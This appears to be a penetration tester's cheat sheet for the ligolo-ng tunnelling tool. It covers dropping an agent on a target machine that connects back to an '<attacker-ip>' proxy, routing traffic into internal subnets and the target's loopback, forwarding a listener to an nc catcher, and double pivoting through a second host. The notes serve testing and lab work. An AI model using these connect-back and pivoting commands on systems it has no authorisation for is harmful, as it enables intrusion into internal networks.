# Setup

```sh
sudo apt update && sudo apt install ligolo-ng -y
sudo ligolo-proxy -selfcert
```

# Usage

## Transfer agent

Head to [here](https://github.com/nicocha30/ligolo-ng/releases) and download the agent. Depends on the OS and cpu architecture, download one. In my case, I'm using windows agent.

```sh
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_windows_amd64.zip
```

Transfer the agent to target machine

## Open reverse tunnel server on attacker

```sh
sudo ligolo-proxy -selfcert
```

## Connect back to attacker using agent

No privileges are required

```sh
.\agent.exe -connect <attacker-ip>:11601 -ignore-cert
```

## Tunneling

```
ligolo-ng » interface_create --name "ligolo"
ligolo-ng » session
# Choose a session
tunnel_start --tun ligolo
ifconfig
interface_add_route --name ligolo --route 192.168.69.0/24
```

### Tunnel to target's loopback interface

If you query an IP address on the `240.0.0.0/4` subnet, `Ligolo-ng` will automatically redirect traffic to the agent's loopback IP address

```sh
sudo ip route add 240.0.0.1/32 dev ligolo
nmap -p 445 240.0.0.1
```

## Listening

On ligolo

```
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp
```

This will create a TCP listening socket on the agent (0.0.0.0:1234) and redirect connections to the 4321 port of the proxy server (attacker machine).

```sh
nc -nvlp 4321
```

## Double pivoting

Create interface

```
ligolo-ng » interface_create --name "ligolo-2"
```

Add listener on first pivot box. Use the same port that ligolo proxy server (attacker machine) is running.

```
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
```

On second pivoting box, run the agent. `192.168.69.69` is the ip of the first pivot box

```
.\agent -connect 192.168.69.69:11601 -ignore-cert
```

Create tunnel

```
ligolo-ng » session
tunnel_start --tun ligolo-2
ifconfig
interface_add_route --name ligolo-2 --route 192.168.96.0/24
```